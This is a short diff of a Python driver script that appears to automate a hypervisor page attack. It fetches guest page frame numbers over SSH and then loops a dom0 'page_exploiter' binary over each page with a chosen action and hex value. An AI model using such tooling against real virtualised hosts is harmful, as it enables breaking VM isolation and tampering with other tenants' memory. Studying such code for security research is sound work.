@@ -108,12 +108,15 @@ if __name__ == '__main__':
     cmd = "ssh {} 'cd vm2handler && python3 domU_broker.py --script {} --region {} " \
           "--order {}'".format(host["hostname"], args.script, args.region, args.order)
 
-    gpfn = execute_or_abort(cmd, "Could not acquire the gpfn", log=logger)
-    logger.info("Returned GPFN {}".format(gpfn))
+    gpfn_out = execute_or_abort(cmd, "Could not acquire the gpfn", log=logger)
+    gpfn_list = gpfn_out.split()
 
-    cmd = "cd dom0 && ./page_exploiter -d {} -a {} -H '{}' {}".format(host["id"], args.action, args.hex, gpfn)
-    output = execute_or_abort(cmd, "Could not exploit page",cmd_msg="Will exploit the page with",log=logger)
+    logger.info("Returned GPFN {}".format(gpfn_list))
 
-    logger.info("Output of the page exploiter: \n{}\n".format(output))
+    for gpfn in gpfn_list: 
+        cmd = "cd dom0 && ./page_exploiter -d {} -a {} -H '{}' {}".format(host["id"], args.action, args.hex, gpfn)
+        output = execute_or_abort(cmd, "Could not exploit page",cmd_msg="Will exploit the page with",log=logger)
+
+        logger.info("Output of the page exploiter: \n{}\n".format(output))
     logger.info("Exploit done!!")
 
